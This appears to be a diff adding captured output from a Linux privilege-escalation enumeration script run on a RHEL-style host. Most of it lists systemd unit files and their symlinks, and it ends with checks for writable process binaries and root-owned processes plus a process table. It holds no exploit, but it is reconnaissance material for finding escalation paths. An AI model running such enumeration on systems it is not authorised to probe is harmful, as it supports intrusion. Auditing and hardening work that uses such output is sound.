+-rw-r--r--  1 root root  695 Jul  3  2019 systemd-localed.service
+-rw-r--r--  1 root root 1.2K Jul  3  2019 systemd-logind.service
+-rw-r--r--  1 root root  682 Jul  3  2019 systemd-machine-id-commit.service
+-rw-r--r--  1 root root  819 Jul  3  2019 systemd-machined.service
+-rw-r--r--  1 root root 1.1K Jul  3  2019 systemd-modules-load.service
+-rw-r--r--  1 root root  676 Jul  3  2019 systemd-nspawn@.service
+-rw-r--r--  1 root root  557 Jul  3  2019 systemd-poweroff.service
+-rw-r--r--  1 root root  689 Jul  3  2019 systemd-quotacheck.service
+-rw-r--r--  1 root root  777 Jul  3  2019 systemd-random-seed.service
+-rw-r--r--  1 root root  845 Jul  3  2019 systemd-readahead-collect.service
+-rw-r--r--  1 root root  642 Jul  3  2019 systemd-readahead-done.service
+-rw-r--r--  1 root root  635 Jul  3  2019 systemd-readahead-done.timer
+-rw-r--r--  1 root root  555 Jul  3  2019 systemd-readahead-drop.service
+-rw-r--r--  1 root root  757 Jul  3  2019 systemd-readahead-replay.service
+-rw-r--r--  1 root root  552 Jul  3  2019 systemd-reboot.service
+-rw-r--r--  1 root root  828 Jul  3  2019 systemd-remount-fs.service
+-rw-r--r--  1 root root  813 Jul  3  2019 systemd-rfkill@.service
+-rw-r--r--  1 root root  479 Jul  3  2019 systemd-shutdownd.service
+-rw-r--r--  1 root root  528 Jul  3  2019 systemd-shutdownd.socket
+-rw-r--r--  1 root root  501 Jul  3  2019 systemd-suspend.service
+-rw-r--r--  1 root root  711 Jul  3  2019 systemd-sysctl.service
+-rw-r--r--  1 root root  659 Jul  3  2019 systemd-timedated.service
+-rw-r--r--  1 root root  669 Jul  3  2019 systemd-tmpfiles-clean.service
+-rw-r--r--  1 root root  450 Jul  3  2019 systemd-tmpfiles-clean.timer
+-rw-r--r--  1 root root  774 Jul  3  2019 systemd-tmpfiles-setup-dev.service
+-rw-r--r--  1 root root  754 Jul  3  2019 systemd-tmpfiles-setup.service
+-rw-r--r--  1 root root  827 Jul  3  2019 systemd-udev-settle.service
+-rw-r--r--  1 root root  751 Jul  3  2019 systemd-udev-trigger.service
+-rw-r--r--  1 root root  595 Jul  3  2019 systemd-udevd-control.socket
+-rw-r--r--  1 root root  570 Jul  3  2019 systemd-udevd-kernel.socket
+-rw-r--r--  1 root root  812 Jul  3  2019 systemd-udevd.service
+-rw-r--r--  1 root root  701 Jul  3  2019 systemd-update-done.service
+-rw-r--r--  1 root root  761 Jul  3  2019 systemd-update-utmp-runlevel.service
+-rw-r--r--  1 root root  829 Jul  3  2019 systemd-update-utmp.service
+-rw-r--r--  1 root root  581 Jul  3  2019 systemd-user-sessions.service
+-rw-r--r--  1 root root  690 Jul  3  2019 systemd-vconsole-setup.service
+-rw-r--r--  1 root root  395 Jul  3  2019 time-sync.target
+-rw-r--r--  1 root root  405 Jul  3  2019 timers.target
+-rw-r--r--  1 root root  703 Jul  3  2019 tmp.mount
+-rw-r--r--  1 root root  417 Jul  3  2019 umount.target
+-rw-r--r--  1 root root  392 Jul  3  2019 user.slice
+-r--r--r--  1 root root  406 Jul  3  2019 blk-availability.service
+-r--r--r--  1 root root  345 Jul  3  2019 dm-event.service
+-r--r--r--  1 root root  248 Jul  3  2019 dm-event.socket
+-r--r--r--  1 root root  314 Jul  3  2019 lvm2-lvmetad.service
+-r--r--r--  1 root root  241 Jul  3  2019 lvm2-lvmetad.socket
+-r--r--r--  1 root root  304 Jul  3  2019 lvm2-lvmpolld.service
+-r--r--r--  1 root root  239 Jul  3  2019 lvm2-lvmpolld.socket
+-r--r--r--  1 root root  666 Jul  3  2019 lvm2-monitor.service
+-r--r--r--  1 root root  411 Jul  3  2019 lvm2-pvscan@.service
+lrwxrwxrwx. 1 root root   12 Jul  2  2019 messagebus.service -> dbus.service
+drwxr-xr-x. 2 root root   35 Jul  2  2019 halt.target.wants
+drwxr-xr-x. 2 root root   72 Jul  2  2019 initrd-switch-root.target.wants
+drwxr-xr-x. 2 root root   36 Jul  2  2019 kexec.target.wants
+drwxr-xr-x. 2 root root  225 Jul  2  2019 initrd.target.wants
+drwxr-xr-x. 2 root root   37 Jul  2  2019 shutdown.target.wants
+lrwxrwxrwx. 1 root root   56 Jul  2  2019 dracut-shutdown.service -> ../../dracut/modules.d/98systemd/dracut-shutdown.service
+lrwxrwxrwx. 1 root root   56 Jul  2  2019 dracut-pre-udev.service -> ../../dracut/modules.d/98systemd/dracut-pre-udev.service
+lrwxrwxrwx. 1 root root   59 Jul  2  2019 dracut-pre-trigger.service -> ../../dracut/modules.d/98systemd/dracut-pre-trigger.service
+lrwxrwxrwx. 1 root root   57 Jul  2  2019 dracut-pre-pivot.service -> ../../dracut/modules.d/98systemd/dracut-pre-pivot.service
+lrwxrwxrwx. 1 root root   57 Jul  2  2019 dracut-initqueue.service -> ../../dracut/modules.d/98systemd/dracut-initqueue.service
+lrwxrwxrwx. 1 root root   53 Jul  2  2019 dracut-mount.service -> ../../dracut/modules.d/98systemd/dracut-mount.service
+lrwxrwxrwx. 1 root root   57 Jul  2  2019 dracut-pre-mount.service -> ../../dracut/modules.d/98systemd/dracut-pre-mount.service
+lrwxrwxrwx. 1 root root   55 Jul  2  2019 dracut-cmdline.service -> ../../dracut/modules.d/98systemd/dracut-cmdline.service
+-rw-r--r--. 1 root root  284 Jun 26  2019 microcode.service
+-rw-r--r--. 1 root root  294 Jun 18  2019 cpupower.service
+-rw-r--r--. 1 root root  527 Apr 25  2019 selinux-policy-migrate-local-changes@.service
+-rw-r--r--. 1 root root  313 Apr 24  2019 kdump.service
+-rw-r--r--. 1 root root  350 Apr 24  2019 htcacheclean.service
+-rw-r--r--. 1 root root  752 Apr 24  2019 httpd.service
+-rw-r--r--. 1 root root   95 Mar 14  2019 fstrim.service
+-rw-r--r--. 1 root root  174 Mar 14  2019 fstrim.timer
+-rw-r--r--. 1 root root  353 Mar 14  2019 NetworkManager-dispatcher.service
+-rw-r--r--. 1 root root  303 Mar 14  2019 NetworkManager-wait-online.service
+-rw-r--r--. 1 root root 1.5K Mar 14  2019 NetworkManager.service
+-rw-r--r--. 1 root root  366 Mar 14  2019 dbus.service
+-rw-r--r--. 1 root root  102 Mar 14  2019 dbus.socket
+-rw-r--r--. 1 root root  172 Mar  8  2019 polkit.service
+-rw-r--r--. 1 root root  284 Nov 20  2018 crond.service
+-rw-r--r--. 1 root root  465 Oct 31  2018 rsyslog.service
+-rw-r--r--. 1 root root  365 Oct 31  2018 wpa_supplicant.service
+-rw-r--r--. 1 root root  657 Oct 30  2018 firewalld.service
+-rw-r--r--. 1 root root 1.2K Oct 30  2018 auditd.service
+-rw-r--r--. 1 root root  184 Oct 30  2018 iprdump.service
+-rw-r--r--. 1 root root  143 Oct 30  2018 iprinit.service
+-rw-r--r--. 1 root root  147 Oct 30  2018 iprupdate.service
+-rw-r--r--. 1 root root  173 Oct 30  2018 iprutils.target
+-rw-r--r--. 1 root root  463 Oct 30  2018 postfix.service
+-rw-r--r--. 1 root root  263 Oct 30  2018 vgauthd.service
+-rw-r--r--. 1 root root  311 Oct 30  2018 vmtoolsd.service
+-rw-r--r--. 1 root root  160 Aug 24  2018 brandbot.path
+-rw-r--r--. 1 root root  116 Aug 24  2018 brandbot.service
+-rw-r--r--. 1 root root  410 Aug 24  2018 rhel-autorelabel-mark.service
+-rw-r--r--. 1 root root  446 Aug 24  2018 rhel-autorelabel.service
+-rw-r--r--. 1 root root  408 Aug 24  2018 rhel-configure.service
+-rw-r--r--. 1 root root  217 Aug 24  2018 rhel-dmesg.service
+-rw-r--r--. 1 root root  331 Aug 24  2018 rhel-domainname.service
+-rw-r--r--. 1 root root  450 Aug 24  2018 rhel-import-state.service
+-rw-r--r--. 1 root root  437 Aug 24  2018 rhel-loadmodules.service
+-rw-r--r--. 1 root root  401 Aug 24  2018 rhel-readonly.service
+-rw-r--r--. 1 root root  376 Jul  4  2018 tuned.service
+-rw-r--r--. 1 root root  381 Apr 13  2018 plymouth-halt.service
+-rw-r--r--. 1 root root  396 Apr 13  2018 plymouth-kexec.service
+-rw-r--r--. 1 root root  393 Apr 13  2018 plymouth-poweroff.service
+-rw-r--r--. 1 root root  243 Apr 13  2018 plymouth-quit-wait.service
+-rw-r--r--. 1 root root  235 Apr 13  2018 plymouth-quit.service
+-rw-r--r--. 1 root root  282 Apr 13  2018 plymouth-read-write.service
+-rw-r--r--. 1 root root  386 Apr 13  2018 plymouth-reboot.service
+-rw-r--r--. 1 root root  546 Apr 13  2018 plymouth-start.service
+-rw-r--r--. 1 root root  295 Apr 13  2018 plymouth-switch-root.service
+-rw-r--r--. 1 root root  419 Apr 13  2018 systemd-ask-password-plymouth.path
+-rw-r--r--. 1 root root  400 Apr 13  2018 systemd-ask-password-plymouth.service
+-rw-r--r--. 1 root root  209 Apr 11  2018 irqbalance.service
+-rw-r--r--. 1 root root  313 Apr 11  2018 sshd-keygen.service
+-rw-r--r--. 1 root root  373 Apr 11  2018 sshd.service
+-rw-r--r--. 1 root root  181 Apr 11  2018 sshd.socket
+-rw-r--r--. 1 root root  260 Apr 11  2018 sshd@.service
+-rw-r--r--. 1 root root  208 Apr 10  2018 ebtables.service
+-rw-r--r--. 1 root root  295 Apr 10  2018 saslauthd.service
+-rw-r--r--. 1 root root  243 Aug  4  2017 rdisc.service
+-rw-r--r--. 1 root root  482 Aug  3  2017 sendmail.service
+-rw-r--r--. 1 root root  605 Aug  3  2017 sm-client.service
+-rw-r--r--  1 root root  244 Mar 17  2017 teamd@.service
+
+/lib/systemd/system/timers.target.wants:
+total 0
+lrwxrwxrwx 1 root root 31 Jul  8  2019 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer
+
+/lib/systemd/system/sysinit.target.wants:
+total 0
+lrwxrwxrwx  1 root root 30 Jul  8  2019 systemd-update-done.service -> ../systemd-update-done.service
+lrwxrwxrwx  1 root root 30 Jul  8  2019 systemd-update-utmp.service -> ../systemd-update-utmp.service
+lrwxrwxrwx  1 root root 33 Jul  8  2019 systemd-vconsole-setup.service -> ../systemd-vconsole-setup.service
+lrwxrwxrwx  1 root root 37 Jul  8  2019 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
+lrwxrwxrwx  1 root root 33 Jul  8  2019 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
+lrwxrwxrwx  1 root root 31 Jul  8  2019 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
+lrwxrwxrwx  1 root root 24 Jul  8  2019 systemd-udevd.service -> ../systemd-udevd.service
+lrwxrwxrwx  1 root root 30 Jul  8  2019 systemd-random-seed.service -> ../systemd-random-seed.service
+lrwxrwxrwx  1 root root 25 Jul  8  2019 systemd-sysctl.service -> ../systemd-sysctl.service
+lrwxrwxrwx  1 root root 32 Jul  8  2019 systemd-journal-flush.service -> ../systemd-journal-flush.service
+lrwxrwxrwx  1 root root 27 Jul  8  2019 systemd-journald.service -> ../systemd-journald.service
+lrwxrwxrwx  1 root root 36 Jul  8  2019 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
+lrwxrwxrwx  1 root root 31 Jul  8  2019 systemd-modules-load.service -> ../systemd-modules-load.service
+lrwxrwxrwx  1 root root 30 Jul  8  2019 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
+lrwxrwxrwx  1 root root 41 Jul  8  2019 systemd-journal-catalog-update.service -> ../systemd-journal-catalog-update.service
+lrwxrwxrwx  1 root root 28 Jul  8  2019 systemd-firstboot.service -> ../systemd-firstboot.service
+lrwxrwxrwx  1 root root 25 Jul  8  2019 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
+lrwxrwxrwx  1 root root 36 Jul  8  2019 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
+lrwxrwxrwx  1 root root 25 Jul  8  2019 systemd-binfmt.service -> ../systemd-binfmt.service
+lrwxrwxrwx  1 root root 36 Jul  8  2019 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
+lrwxrwxrwx  1 root root 32 Jul  8  2019 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
+lrwxrwxrwx  1 root root 26 Jul  8  2019 sys-kernel-config.mount -> ../sys-kernel-config.mount
+lrwxrwxrwx  1 root root 22 Jul  8  2019 dev-hugepages.mount -> ../dev-hugepages.mount
+lrwxrwxrwx  1 root root 19 Jul  8  2019 dev-mqueue.mount -> ../dev-mqueue.mount
+lrwxrwxrwx  1 root root 28 Jul  8  2019 kmod-static-nodes.service -> ../kmod-static-nodes.service
+lrwxrwxrwx  1 root root 20 Jul  8  2019 cryptsetup.target -> ../cryptsetup.target
+lrwxrwxrwx. 1 root root 30 Jul  2  2019 plymouth-read-write.service -> ../plymouth-read-write.service
+lrwxrwxrwx. 1 root root 25 Jul  2  2019 plymouth-start.service -> ../plymouth-start.service
+
+/lib/systemd/system/sockets.target.wants:
+total 0
+lrwxrwxrwx  1 root root 27 Jul  8  2019 systemd-shutdownd.socket -> ../systemd-shutdownd.socket
+lrwxrwxrwx  1 root root 31 Jul  8  2019 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
+lrwxrwxrwx  1 root root 30 Jul  8  2019 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
+lrwxrwxrwx  1 root root 25 Jul  8  2019 systemd-initctl.socket -> ../systemd-initctl.socket
+lrwxrwxrwx  1 root root 26 Jul  8  2019 systemd-journald.socket -> ../systemd-journald.socket
+lrwxrwxrwx. 1 root root 14 Jul  2  2019 dbus.socket -> ../dbus.socket
+
+/lib/systemd/system/runlevel5.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Jul  8  2019 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+/lib/systemd/system/runlevel4.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Jul  8  2019 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+/lib/systemd/system/runlevel2.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Jul  8  2019 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+/lib/systemd/system/runlevel3.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Jul  8  2019 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+/lib/systemd/system/runlevel1.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Jul  8  2019 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+/lib/systemd/system/rescue.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Jul  8  2019 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+/lib/systemd/system/reboot.target.wants:
+total 0
+lrwxrwxrwx  1 root root 39 Jul  8  2019 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+lrwxrwxrwx. 1 root root 26 Jul  2  2019 plymouth-reboot.service -> ../plymouth-reboot.service
+
+/lib/systemd/system/poweroff.target.wants:
+total 0
+lrwxrwxrwx  1 root root 39 Jul  8  2019 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+lrwxrwxrwx. 1 root root 28 Jul  2  2019 plymouth-poweroff.service -> ../plymouth-poweroff.service
+
+/lib/systemd/system/multi-user.target.wants:
+total 0
+lrwxrwxrwx  1 root root 32 Jul  8  2019 systemd-user-sessions.service -> ../systemd-user-sessions.service
+lrwxrwxrwx  1 root root 39 Jul  8  2019 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+lrwxrwxrwx  1 root root 25 Jul  8  2019 systemd-logind.service -> ../systemd-logind.service
+lrwxrwxrwx  1 root root 33 Jul  8  2019 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
+lrwxrwxrwx  1 root root 15 Jul  8  2019 getty.target -> ../getty.target
+lrwxrwxrwx. 1 root root 15 Jul  2  2019 dbus.service -> ../dbus.service
+lrwxrwxrwx. 1 root root 29 Jul  2  2019 plymouth-quit-wait.service -> ../plymouth-quit-wait.service
+lrwxrwxrwx. 1 root root 24 Jul  2  2019 plymouth-quit.service -> ../plymouth-quit.service
+
+/lib/systemd/system/local-fs.target.wants:
+total 0
+lrwxrwxrwx 1 root root 29 Jul  8  2019 systemd-remount-fs.service -> ../systemd-remount-fs.service
+
+/lib/systemd/system/graphical.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Jul  8  2019 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+/lib/systemd/system/basic.target.wants:
+total 0
+lrwxrwxrwx. 1 root root 48 Jul  2  2019 selinux-policy-migrate-local-changes@targeted.service -> ../selinux-policy-migrate-local-changes@.service
+
+/lib/systemd/system/dbus.target.wants:
+total 0
+
+/lib/systemd/system/default.target.wants:
+total 0
+
+/lib/systemd/system/syslog.target.wants:
+total 0
+
+/lib/systemd/system/halt.target.wants:
+total 0
+lrwxrwxrwx. 1 root root 24 Jul  2  2019 plymouth-halt.service -> ../plymouth-halt.service
+
+/lib/systemd/system/initrd-switch-root.target.wants:
+total 0
+lrwxrwxrwx. 1 root root 25 Jul  2  2019 plymouth-start.service -> ../plymouth-start.service
+lrwxrwxrwx. 1 root root 31 Jul  2  2019 plymouth-switch-root.service -> ../plymouth-switch-root.service
+
+/lib/systemd/system/kexec.target.wants:
+total 0
+lrwxrwxrwx. 1 root root 25 Jul  2  2019 plymouth-kexec.service -> ../plymouth-kexec.service
+
+/lib/systemd/system/initrd.target.wants:
+total 0
+lrwxrwxrwx. 1 root root 26 Jul  2  2019 dracut-pre-udev.service -> ../dracut-pre-udev.service
+lrwxrwxrwx. 1 root root 27 Jul  2  2019 dracut-pre-mount.service -> ../dracut-pre-mount.service
+lrwxrwxrwx. 1 root root 27 Jul  2  2019 dracut-pre-pivot.service -> ../dracut-pre-pivot.service
+lrwxrwxrwx. 1 root root 29 Jul  2  2019 dracut-pre-trigger.service -> ../dracut-pre-trigger.service
+lrwxrwxrwx. 1 root root 27 Jul  2  2019 dracut-initqueue.service -> ../dracut-initqueue.service
+lrwxrwxrwx. 1 root root 23 Jul  2  2019 dracut-mount.service -> ../dracut-mount.service
+lrwxrwxrwx. 1 root root 25 Jul  2  2019 dracut-cmdline.service -> ../dracut-cmdline.service
+
+/lib/systemd/system/shutdown.target.wants:
+total 0
+lrwxrwxrwx. 1 root root 26 Jul  2  2019 dracut-shutdown.service -> ../dracut-shutdown.service
+
+/lib/systemd/system-generators:
+total 648K
+-rwxr-xr-x  1 root root  94K Jul  3  2019 systemd-cryptsetup-generator
+-rwxr-xr-x  1 root root  49K Jul  3  2019 systemd-debug-generator
+-rwxr-xr-x  1 root root  65K Jul  3  2019 systemd-efi-boot-generator
+-rwxr-xr-x  1 root root  94K Jul  3  2019 systemd-fstab-generator
+-rwxr-xr-x  1 root root  49K Jul  3  2019 systemd-getty-generator
+-rwxr-xr-x  1 root root  49K Jul  3  2019 systemd-hibernate-resume-generator
+-rwxr-xr-x  1 root root  45K Jul  3  2019 systemd-rc-local-generator
+-rwxr-xr-x  1 root root  37K Jul  3  2019 systemd-system-update-generator
+-rwxr-xr-x  1 root root 127K Jul  3  2019 systemd-sysv-generator
+-r-xr-xr-x  1 root root  12K Jul  3  2019 lvm2-activation-generator
+-rwxr-xr-x. 1 root root  504 Apr 24  2019 kdump-dep-generator.sh
+
+/lib/systemd/user:
+total 16K
+lrwxrwxrwx 1 root root  23 Jul  8  2019 timers.target -> ../system/timers.target
+lrwxrwxrwx 1 root root  22 Jul  8  2019 sound.target -> ../system/sound.target
+lrwxrwxrwx 1 root root  24 Jul  8  2019 sockets.target -> ../system/sockets.target
+lrwxrwxrwx 1 root root  26 Jul  8  2019 smartcard.target -> ../system/smartcard.target
+lrwxrwxrwx 1 root root  25 Jul  8  2019 shutdown.target -> ../system/shutdown.target
+lrwxrwxrwx 1 root root  24 Jul  8  2019 printer.target -> ../system/printer.target
+lrwxrwxrwx 1 root root  22 Jul  8  2019 paths.target -> ../system/paths.target
+lrwxrwxrwx 1 root root  26 Jul  8  2019 bluetooth.target -> ../system/bluetooth.target
+-rw-r--r-- 1 root root 457 Jul  3  2019 basic.target
+-rw-r--r-- 1 root root 414 Jul  3  2019 default.target
+-rw-r--r-- 1 root root 499 Jul  3  2019 exit.target
+-rw-r--r-- 1 root root 501 Jul  3  2019 systemd-exit.service
+
+/lib/systemd/system-preset:
+total 16K
+-rw-r--r--  1 root root   10 Jul  3  2019 99-default-disable.preset
+-rw-r--r--  1 root root  928 Jul  3  2019 90-systemd.preset
+-rw-r--r--. 1 root root  264 Nov 23  2018 85-display-manager.preset
+-rw-r--r--. 1 root root 3.8K Nov 23  2018 90-default.preset
+
+/lib/systemd/catalog:
+total 76K
+-rw-r--r-- 1 root root 9.7K Jul  3  2019 systemd.catalog
+-rw-r--r-- 1 root root  10K Jul  3  2019 systemd.fr.catalog
+-rw-r--r-- 1 root root 9.2K Jul  3  2019 systemd.it.catalog
+-rw-r--r-- 1 root root 9.3K Jul  3  2019 systemd.pl.catalog
+-rw-r--r-- 1 root root 9.6K Jul  3  2019 systemd.pt_BR.catalog
+-rw-r--r-- 1 root root  14K Jul  3  2019 systemd.ru.catalog
+
+/lib/systemd/user-preset:
+total 0
+
+/lib/systemd/ntp-units.d:
+total 0
+
+/lib/systemd/system-shutdown:
+total 0
+
+/lib/systemd/system-sleep:
+total 0
+
+/lib/systemd/user-generators:
+total 0
+
+/etc/systemd/:
+total 28K
+drwxr-xr-x. 12 root root 4.0K Jul  3  2019 system
+-rw-r--r--   1 root root  720 Jul  3  2019 bootchart.conf
+-rw-r--r--   1 root root  615 Jul  3  2019 coredump.conf
+-rw-r--r--   1 root root  983 Jul  3  2019 journald.conf
+-rw-r--r--   1 root root  957 Jul  3  2019 logind.conf
+-rw-r--r--   1 root root 1.6K Jul  3  2019 system.conf
+drwxr-xr-x.  2 root root    6 Jul  3  2019 user
+-rw-r--r--   1 root root 1.2K Jul  3  2019 user.conf
+
+/etc/systemd/system:
+total 4.0K
+drwxr-xr-x. 2 root root 4.0K Jul  2  2019 multi-user.target.wants
+drwxr-xr-x. 2 root root   29 Jul  2  2019 vmtoolsd.service.requires
+lrwxrwxrwx. 1 root root   37 Jul  2  2019 default.target -> /lib/systemd/system/multi-user.target
+drwxr-xr-x. 2 root root   57 Jul  2  2019 basic.target.wants
+drwxr-xr-x. 2 root root  217 Jul  2  2019 sysinit.target.wants
+lrwxrwxrwx. 1 root root   41 Jul  2  2019 dbus-org.fedoraproject.FirewallD1.service -> /usr/lib/systemd/system/firewalld.service
+drwxr-xr-x. 2 root root   29 Jul  2  2019 sockets.target.wants
+drwxr-xr-x. 2 root root   48 Jul  2  2019 network-online.target.wants
+lrwxrwxrwx. 1 root root   46 Jul  2  2019 dbus-org.freedesktop.NetworkManager.service -> /usr/lib/systemd/system/NetworkManager.service
+lrwxrwxrwx. 1 root root   57 Jul  2  2019 dbus-org.freedesktop.nm-dispatcher.service -> /usr/lib/systemd/system/NetworkManager-dispatcher.service
+drwxr-xr-x. 2 root root   35 Jul  2  2019 local-fs.target.wants
+drwxr-xr-x. 2 root root   87 Jul  2  2019 default.target.wants
+drwxr-xr-x. 2 root root   32 Jul  2  2019 getty.target.wants
+drwxr-xr-x. 2 root root   44 Jul  2  2019 system-update.target.wants
+
+/etc/systemd/system/multi-user.target.wants:
+total 0
+lrwxrwxrwx. 1 root root 37 Jul  2  2019 httpd.service -> /usr/lib/systemd/system/httpd.service
+lrwxrwxrwx. 1 root root 40 Jul  2  2019 sendmail.service -> /usr/lib/systemd/system/sendmail.service
+lrwxrwxrwx. 1 root root 41 Jul  2  2019 sm-client.service -> /usr/lib/systemd/system/sm-client.service
+lrwxrwxrwx. 1 root root 40 Jul  2  2019 vmtoolsd.service -> /usr/lib/systemd/system/vmtoolsd.service
+lrwxrwxrwx. 1 root root 39 Jul  2  2019 rsyslog.service -> /usr/lib/systemd/system/rsyslog.service
+lrwxrwxrwx. 1 root root 42 Jul  2  2019 irqbalance.service -> /usr/lib/systemd/system/irqbalance.service
+lrwxrwxrwx. 1 root root 38 Jul  2  2019 auditd.service -> /usr/lib/systemd/system/auditd.service
+lrwxrwxrwx. 1 root root 36 Jul  2  2019 sshd.service -> /usr/lib/systemd/system/sshd.service
+lrwxrwxrwx. 1 root root 37 Jul  2  2019 kdump.service -> /usr/lib/systemd/system/kdump.service
+lrwxrwxrwx. 1 root root 41 Jul  2  2019 firewalld.service -> /usr/lib/systemd/system/firewalld.service
+lrwxrwxrwx. 1 root root 37 Jul  2  2019 tuned.service -> /usr/lib/systemd/system/tuned.service
+lrwxrwxrwx. 1 root root 46 Jul  2  2019 NetworkManager.service -> /usr/lib/systemd/system/NetworkManager.service
+lrwxrwxrwx. 1 root root 37 Jul  2  2019 crond.service -> /usr/lib/systemd/system/crond.service
+lrwxrwxrwx. 1 root root 46 Jul  2  2019 rhel-configure.service -> /usr/lib/systemd/system/rhel-configure.service
+lrwxrwxrwx. 1 root root 40 Jul  2  2019 remote-fs.target -> /usr/lib/systemd/system/remote-fs.target
+
+/etc/systemd/system/vmtoolsd.service.requires:
+total 0
+lrwxrwxrwx. 1 root root 39 Jul  2  2019 vgauthd.service -> /usr/lib/systemd/system/vgauthd.service
+
+/etc/systemd/system/basic.target.wants:
+total 0
+lrwxrwxrwx. 1 root root 41 Jul  2  2019 microcode.service -> /usr/lib/systemd/system/microcode.service
+lrwxrwxrwx. 1 root root 42 Jul  2  2019 rhel-dmesg.service -> /usr/lib/systemd/system/rhel-dmesg.service
+
+/etc/systemd/system/sysinit.target.wants:
+total 0
+lrwxrwxrwx. 1 root root 44 Jul  2  2019 lvm2-lvmpolld.socket -> /usr/lib/systemd/system/lvm2-lvmpolld.socket
+lrwxrwxrwx. 1 root root 43 Jul  2  2019 lvm2-lvmetad.socket -> /usr/lib/systemd/system/lvm2-lvmetad.socket
+lrwxrwxrwx. 1 root root 44 Jul  2  2019 lvm2-monitor.service -> /usr/lib/systemd/system/lvm2-monitor.service
+lrwxrwxrwx. 1 root root 48 Jul  2  2019 rhel-loadmodules.service -> /usr/lib/systemd/system/rhel-loadmodules.service
+lrwxrwxrwx. 1 root root 48 Jul  2  2019 rhel-autorelabel.service -> /usr/lib/systemd/system/rhel-autorelabel.service
+lrwxrwxrwx. 1 root root 47 Jul  2  2019 rhel-domainname.service -> /usr/lib/systemd/system/rhel-domainname.service
+lrwxrwxrwx. 1 root root 49 Jul  2  2019 rhel-import-state.service -> /usr/lib/systemd/system/rhel-import-state.service
+
+/etc/systemd/system/sockets.target.wants:
+total 0
+lrwxrwxrwx. 1 root root 39 Jul  2  2019 dm-event.socket -> /usr/lib/systemd/system/dm-event.socket
+
+/etc/systemd/system/network-online.target.wants:
+total 0
+lrwxrwxrwx. 1 root root 58 Jul  2  2019 NetworkManager-wait-online.service -> /usr/lib/systemd/system/NetworkManager-wait-online.service
+
+/etc/systemd/system/local-fs.target.wants:
+total 0
+lrwxrwxrwx. 1 root root 45 Jul  2  2019 rhel-readonly.service -> /usr/lib/systemd/system/rhel-readonly.service
+
+/etc/systemd/system/default.target.wants:
+total 0
+lrwxrwxrwx. 1 root root 57 Jul  2  2019 systemd-readahead-collect.service -> /usr/lib/systemd/system/systemd-readahead-collect.service
+lrwxrwxrwx. 1 root root 56 Jul  2  2019 systemd-readahead-replay.service -> /usr/lib/systemd/system/systemd-readahead-replay.service
+
+/etc/systemd/system/getty.target.wants:
+total 0
+lrwxrwxrwx. 1 root root 38 Jul  2  2019 getty@tty1.service -> /usr/lib/systemd/system/getty@.service
+
+/etc/systemd/system/system-update.target.wants:
+total 0
+lrwxrwxrwx. 1 root root 54 Jul  2  2019 systemd-readahead-drop.service -> /usr/lib/systemd/system/systemd-readahead-drop.service
+
+/etc/systemd/user:
+total 0
+---
+==============================================================( processes )=====
+[!] pro000 Can we write in any process binary?............................. nope
+[*] pro010 Processes running with root permissions......................... yes!
+---
+UID         PID   PPID  C STIME TTY          TIME CMD
+root          1      0  0 14:48 ?        00:00:01 /usr/lib/systemd/systemd --switched-root --system --deserialize 22
+root       3008      1  0 14:48 ?        00:00:00 /usr/lib/systemd/systemd-journald
+root       3027      1  0 14:48 ?        00:00:00 /usr/sbin/lvmetad -f
+root       3029      1  0 14:48 ?        00:00:00 /usr/lib/systemd/systemd-udevd
+root       3156      1  0 14:48 ?        00:00:00 /sbin/auditd
+root       3178      1  0 14:48 ?        00:00:00 /usr/lib/systemd/systemd-logind
+root       3186      1  0 14:48 ?        00:00:00 /usr/bin/VGAuthService -s
+root       3187      1  0 14:48 ?        00:00:01 /usr/bin/vmtoolsd
+root       3195      1  0 14:48 ?        00:00:00 /usr/sbin/crond -n
+root       3200      1  0 14:48 ?        00:00:00 /usr/bin/python -Es /usr/sbin/firewalld --nofork --nopid
+root       3202      1  0 14:48 tty1     00:00:00 /sbin/agetty --noclear tty1 linux
+root       3240      1  0 14:49 ?        00:00:00 /usr/sbin/NetworkManager --no-daemon
+root       3652      1  0 14:49 ?        00:00:00 /usr/sbin/rsyslogd -n
+root       3653      1  0 14:49 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND
+root       3654      1  0 14:49 ?        00:00:00 /usr/bin/python2 -Es /usr/sbin/tuned -l -P
+root       3656      1  0 14:49 ?        00:00:00 /usr/sbin/sshd -D
+root       3671      1  0 14:49 ?        00:00:00 sendmail: accepting connections
+root       3913      1  0 15:01 ?        00:00:00 /usr/sbin/anacron -s
+root       4451   3029  0 15:09 ?        00:00:00 /usr/lib/systemd/systemd-udevd
+---
+[i] pro500 Running processes............................................... yes!
+---
+USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
